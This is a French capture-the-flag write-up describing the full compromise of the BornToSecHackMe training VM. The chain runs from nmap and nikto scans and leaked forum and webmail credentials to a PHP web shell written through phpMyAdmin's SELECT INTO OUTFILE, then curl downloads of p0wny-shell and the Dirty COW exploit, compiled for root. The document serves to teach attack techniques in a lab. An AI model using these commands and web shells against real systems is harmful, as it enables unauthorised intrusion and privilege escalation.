@@ -1,0 +1,155 @@
+	Writeup 1
+
+	1. Scan de la cible
+
+Pour obtenir un minimum d'information pour bien commencer on utilise nmap
+> nmap -sS x.x.x.x
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 2.0.8 or later
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+143/tcp open  imap     Dovecot imapd
+443/tcp open  ssl/http Apache httpd 2.2.22
+993/tcp open  ssl/imap Dovecot imapd
+On decouvre divers services sur la machine :
+- http il y a un site web accessible
+- ssh un shell peux etre obtenu si on possede un login et un mot de passe
+
+	2. Scan des vulnérabilités
+
+Sur l'OS Kali, on utilise Nikto pour obtenir diverses failles potentielles
+> nikto -h https://x.x.x.x
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.13.0.181
++ Target Hostname:    10.13.0.181
++ Target Port:        443
++ Server: Apache/2.2.22 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Hostname '10.13.0.181' does not match certificate's names: BornToSec
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.20
++ Cookie PHPSESSID created without the secure flag
++ Cookie PHPSESSID created without the httponly flag
++ Cookie mlf2_usersettings created without the secure flag
++ Cookie mlf2_usersettings created without the httponly flag
++ Cookie mlf2_last_visit created without the secure flag
++ Cookie mlf2_last_visit created without the httponly flag
++ OSVDB-3092: /forum/: This might be interesting...
++ Cookie SQMSESSID created without the secure flag
++ Cookie SQMSESSID created without the httponly flag
++ OSVDB-3093: /webmail/src/read_body.php: SquirrelMail found
++ Server leaks inodes via ETags, header found with file /icons/README, inode: 47542, size: 5108, mtime: Tue Aug 28 10:48:10 2007
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 8496 requests: 0 error(s) and 23 item(s) reported on remote host
++ End Time:           2019-05-13 14:29:58 (GMT0) (111 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+On découvre liées au port 443 de la vm l’existences de :
+- un forum "/forum/index.php"
+- un service d'envoi d'email Squirrel "/webmail/src/login.php"
+- phpMyAdmin
+
+	3. Récupération d'un compte sur le forum
+
+On retrouve en navigant sur le forum, un post relativement intrigant:
+# Probleme login ?
+# by lmezard, Thursday, October 08, 2015, 00:10 (1350 days ago)
+Ce dernier est un log du daemon sshd et cron, deux lignes sont intéressantes :
+
+Invalid user adam from 104.245.98.119
+Failed password for invalid user admin from 104.245.98.119 port 32271 ssh2
+
+La première semble indiquer qu'un login invalide vient d'être entré <login>
+La deuxième semble indiquer qu'un mot de passe invalide vient d'être entré <admin>
+On retrouve les lignes suivantes :
+
+Oct 5 08:45:26 BornToSecHackMe sshd[7547]: Invalid user adam from 11.202.39.38
+...
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+
+On envisage qu'un utilisateur ait tenté de se connecter et se soit trompé de login, mais pas de mot de passe.
+Puisqu'on connait la liste des différents utilisateurs sur le forum, après avoir testé tous les users avec ce mot de passe, on obtient un compte :
+lmezard !q\]Ej?*5K5cy*AJ
+
+	4. Access root a la base de données du forum
+
+Sur le compte de lmezard on découvre son adresse email : laurie@borntosec.net
+On se connecte sur la messagerie (SquirrelMail "/webmail/src/login.php") et trouve le message suivant :
+
+Hey Laurie,
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+Best regards.
+
+	5. Exécuter des commandes sur le serveur
+
+Sur phpmyadmin, on va injecter du code dans un fichier afin d’accéder à la machine hôte.
+
+Avec la requête : Select "x" into outfile "file.php" on peut créer un fichier (contenant ce qu'on veut écrire) dans le dossier mysql de l'host du site.
+On pourra ensuite exécuter le code du fichier en entrant directement son url.
+
+Évidemment le dossier mysql n'est pas dans le dossier du site il n'est donc pas accessible.
+Il faut trouver un dossier accessible (comme /forum/x/) sur lequel tous les utilisateurs ont le droit d'écriture.
+
+En cherchant les dossiers habituels des sites webs on apprend qu’il est courant sur Linux d'avoir ses sources dans "/var/www/"
+Avec des requêtes sql on découvre que le dossier "var/www/forum" existe bien.
+
+On utilise dirb pour trouver les dossiers de /forum.
+On essaye donc la requête sql sur les dossiers un par un et on découvre qu'on peut écrire sur le dossier "forum/templates_c/".
+
+On n’a plus qu'à insérer du code php dans un nouveau fichier :
+
+SELECT "<?php system($_GET['cmd']); ?> " Into outfile "/var/www/forum/templates_c/hack.php"
+
+Le fichier a bien été créé, maintenant on peut y accéder en entrant l'url https://x.x.x.x/forum/templates_c/hack.php, et avec un paramètre “cmd”, exécuter des commandes shell.
+
+Pour un meilleur confort, nous pouvons installer un shell plus interactif en PHP: le p0wny-shell
+curl https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php > shell.php
+
+	6. Detection d'exploit
+
+Maintenant que l'on possède un access à un shell sur la vm, on peut tenter un exploit pour devenir root.
+Premièrement on recherche des informations complementaires :
+> uname -a
+
+Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
+
+> lsb_release -c
+
+Distributor ID: Ubuntu
+Description: Ubuntu 12.04.5 LTS
+Release: 12.04
+Codename: precise
+
+Il existe un script qui recherche pour vous les exploits potentiels : linux-exploit-suggester
+https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
+
+Ce dernier propose plus de 30 exploits différents de toute nature.
+Après en avoir essayé beaucoup le deuxième fonctionne :
+
+[+] [CVE-2016-5195] dirtycow 2
+
+Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+Rank: 5
+Download URL: https://www.exploit-db.com/download/40839
+ext-url: https://www.exploit-db.com/download/40847.cpp
+Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+	7. Dirtycow 2
+
+curl https://www.exploit-db.com/download/40839 -o dirty.c
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+
+su firefart
+
+ON EST ROOT !
